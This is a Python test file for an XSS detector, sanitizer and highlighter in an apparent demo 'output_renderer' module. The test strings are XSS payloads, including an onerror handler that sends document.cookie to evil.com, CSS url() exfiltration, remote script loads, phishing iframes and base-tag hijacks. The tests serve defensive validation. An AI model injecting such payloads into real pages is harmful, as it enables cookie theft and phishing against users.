"""Tests for Demo 15 output_renderer — XSS pattern detection, sanitization, and highlighting."""

import pytest

from output_renderer import (
    XSS_PATTERNS,
    detect_xss_patterns,
    render_with_highlights,
    sanitize_html,
)


# ── Pattern Detection Tests ─────────────────────────────────────


class TestDetectScriptTags:
    """Tests for detecting <script> tag patterns."""

    def test_inline_script_tag_detected(self) -> None:
        html = '<script>alert("xss")</script>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "script_tag" in names

    def test_script_tag_with_attributes(self) -> None:
        html = '<script type="text/javascript">document.cookie</script>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "script_tag" in names

    def test_script_tag_case_insensitive(self) -> None:
        html = '<SCRIPT>alert(1)</SCRIPT>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "script_tag" in names

    def test_open_script_tag_without_closing(self) -> None:
        html = '<script src="https://evil.com/payload.js">'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "script_tag_open" in names


class TestDetectEventHandlers:
    """Tests for detecting event handler attributes."""

    def test_onclick_detected(self) -> None:
        html = '<button onclick="alert(1)">Click</button>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "event_handler" in names

    def test_onerror_detected(self) -> None:
        html = '<img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "event_handler" in names

    def test_onload_detected(self) -> None:
        html = '<body onload="stealData()">'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "event_handler" in names

    def test_onmouseover_detected(self) -> None:
        html = '<div onmouseover="alert(document.cookie)">Hover me</div>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "event_handler" in names


class TestDetectJavascriptURLs:
    """Tests for detecting javascript: protocol URLs."""

    def test_href_javascript_detected(self) -> None:
        html = '<a href="javascript:alert(1)">Click</a>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "javascript_url" in names

    def test_src_javascript_detected(self) -> None:
        html = '<iframe src="javascript:document.cookie">'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "javascript_url" in names


class TestDetectDataURLs:
    """Tests for detecting data: URLs with text/html content."""

    def test_data_url_html_detected(self) -> None:
        html = '<a href="data:text/html,<script>alert(1)</script>">Click</a>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "data_url" in names


class TestDetectSVGScripts:
    """Tests for detecting SVG elements with embedded scripts."""

    def test_svg_with_script_detected(self) -> None:
        html = '<svg><script>alert(document.domain)</script></svg>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "svg_script" in names

    def test_svg_with_attributes_and_script(self) -> None:
        html = '<svg xmlns="http://www.w3.org/2000/svg" width="100"><script>alert(1)</script></svg>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "svg_script" in names


class TestDetectCSSExfiltration:
    """Tests for detecting CSS url() exfiltration."""

    def test_background_image_url_detected(self) -> None:
        css = 'div { background-image: url("https://evil.com/exfil?data=secret"); }'
        findings = detect_xss_patterns(css)
        names = [f["name"] for f in findings]
        assert "css_exfiltration" in names

    def test_background_shorthand_url_detected(self) -> None:
        css = 'div { background: url(https://evil.com/track?v=1); }'
        findings = detect_xss_patterns(css)
        names = [f["name"] for f in findings]
        assert "css_exfiltration" in names

    def test_list_style_image_url_detected(self) -> None:
        css = 'li { list-style-image: url("https://evil.com/exfil?item=x"); }'
        findings = detect_xss_patterns(css)
        names = [f["name"] for f in findings]
        assert "css_exfiltration" in names


class TestDetectIframeInjection:
    """Tests for detecting iframe injection."""

    def test_iframe_with_src_detected(self) -> None:
        html = '<iframe src="https://evil.com/phishing"></iframe>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "iframe_injection" in names

    def test_iframe_with_srcdoc_detected(self) -> None:
        html = '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "iframe_injection" in names


class TestDetectMetaRefresh:
    """Tests for detecting meta refresh tags."""

    def test_meta_refresh_detected(self) -> None:
        html = '<meta http-equiv="refresh" content="0;url=https://evil.com">'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "meta_refresh" in names


class TestDetectBaseTagHijack:
    """Tests for detecting base tag hijacking."""

    def test_base_tag_detected(self) -> None:
        html = '<base href="https://evil.com/">'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "base_tag_hijack" in names


# ── Sanitization Tests ──────────────────────────────────────────


class TestSanitizeHTML:
    """Tests for the sanitize_html function."""

    def test_removes_script_tags(self) -> None:
        html = '<p>Hello</p><script>alert(1)</script><p>World</p>'
        result = sanitize_html(html)
        assert "<script>" not in result
        assert "[XSS REMOVED: script_tag]" in result
        assert "<p>Hello</p>" in result

    def test_removes_event_handlers(self) -> None:
        html = '<img src="pic.jpg" onerror="alert(1)">'
        result = sanitize_html(html)
        assert "onerror" not in result
        assert "[XSS REMOVED: event_handler]" in result

    def test_removes_javascript_urls(self) -> None:
        html = '<a href="javascript:alert(1)">Click</a>'
        result = sanitize_html(html)
        assert "javascript:" not in result
        assert "[XSS REMOVED: javascript_url]" in result

    def test_removes_iframe(self) -> None:
        html = '<iframe src="https://evil.com/phishing"></iframe>'
        result = sanitize_html(html)
        assert "<iframe" not in result
        assert "[XSS REMOVED: iframe_injection]" in result

    def test_removes_meta_refresh(self) -> None:
        html = '<meta http-equiv="refresh" content="0;url=https://evil.com">'
        result = sanitize_html(html)
        assert "http-equiv" not in result
        assert "[XSS REMOVED: meta_refresh]" in result

    def test_removes_base_tag(self) -> None:
        html = '<base href="https://evil.com/">'
        result = sanitize_html(html)
        assert "<base" not in result
        assert "[XSS REMOVED: base_tag_hijack]" in result

    def test_safe_content_passes_through(self) -> None:
        html = '<p>This is a normal paragraph with <strong>bold</strong> text.</p>'
        result = sanitize_html(html)
        assert result == html

    def test_multiple_patterns_all_removed(self) -> None:
        html = (
            '<script>alert(1)</script>'
            '<img onerror="steal()">'
            '<iframe src="https://evil.com"></iframe>'
        )
        result = sanitize_html(html)
        assert "<script>" not in result
        assert "onerror" not in result
        assert "<iframe" not in result
        assert result.count("[XSS REMOVED:") >= 3

    def test_empty_string_returns_empty(self) -> None:
        assert sanitize_html("") == ""

    def test_none_returns_none(self) -> None:
        assert sanitize_html(None) is None  # type: ignore[arg-type]

    def test_removes_css_exfiltration(self) -> None:
        css = 'div { background-image: url("https://evil.com/exfil?data=1"); }'
        result = sanitize_html(css)
        assert "evil.com" not in result
        assert "[XSS REMOVED: css_exfiltration]" in result


# ── Highlight Tests ─────────────────────────────────────────────


class TestRenderWithHighlights:
    """Tests for the render_with_highlights function."""

    def test_highlights_script_tag(self) -> None:
        html = '<script>alert(1)</script>'
        result = render_with_highlights(html)
        assert "xss-highlight" in result
        assert "script_tag" in result

    def test_safe_content_no_highlights(self) -> None:
        html = '<p>Hello World</p>'
        result = render_with_highlights(html)
        assert result == html
        assert "xss-highlight" not in result

    def test_empty_returns_empty(self) -> None:
        assert render_with_highlights("") == ""

    def test_highlight_escapes_html_entities(self) -> None:
        html = '<script>alert("xss")</script>'
        result = render_with_highlights(html)
        # The script content should be escaped inside the highlight
        assert "&lt;script&gt;" in result or "xss-highlight" in result


# ── Edge Cases ──────────────────────────────────────────────────


class TestEdgeCases:
    """Edge cases for pattern detection."""

    def test_no_findings_on_clean_html(self) -> None:
        html = '<div class="card"><h1>Hello</h1><p>World</p></div>'
        assert detect_xss_patterns(html) == []

    def test_no_findings_on_empty_string(self) -> None:
        assert detect_xss_patterns("") == []

    def test_no_findings_on_whitespace(self) -> None:
        assert detect_xss_patterns("   \n\t  ") == []

    def test_findings_have_required_keys(self) -> None:
        html = '<script>alert(1)</script>'
        findings = detect_xss_patterns(html)
        assert len(findings) > 0
        for f in findings:
            assert "name" in f
            assert "description" in f
            assert "match" in f
            assert "position" in f
            assert "start" in f["position"]
            assert "end" in f["position"]

    def test_pattern_definitions_have_required_fields(self) -> None:
        for p in XSS_PATTERNS:
            assert "name" in p
            assert "pattern" in p
            assert "description" in p

    def test_long_safe_content_no_findings(self) -> None:
        """Long clean content should pass without error."""
        html = "<p>This is normal text. </p>" * 500
        assert detect_xss_patterns(html) == []

    def test_long_content_with_xss_at_end(self) -> None:
        """XSS pattern at the end of long content is still detected."""
        padding = "<p>Normal content. </p>" * 200
        html = padding + '<script>alert(1)</script>'
        findings = detect_xss_patterns(html)
        names = [f["name"] for f in findings]
        assert "script_tag" in names
